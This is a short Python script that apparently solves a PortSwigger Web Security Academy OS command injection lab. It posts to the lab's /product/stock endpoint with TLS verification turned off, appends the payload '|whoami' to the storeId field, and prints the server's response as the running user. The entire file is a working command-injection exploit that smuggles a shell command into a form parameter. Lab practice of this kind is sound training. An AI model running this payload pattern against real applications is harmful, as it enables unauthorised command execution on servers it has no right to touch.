import urllib3
import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def main() :
    host = "https://0ae7009403b0a58d8211609f005800c5.web-security-academy.net/"
    url = f"{host}/product/stock"
    exploit = "|whoami"

    session = requests.Session()
    params = {
        'productId': '1',
        'storeId': '1',
    }

    params['storeId'] += exploit
    resp = session.post(url, data=params, verify=False, allow_redirects=True)

    if resp.status_code == 200:
        print("Exploit sent successfully.")
        print("User is :", resp.text.strip())
    else:
        print(f"Exploit failed with status code {resp.status_code}")
        print ("Ya siks")

if __name__ == "__main__":
    main()
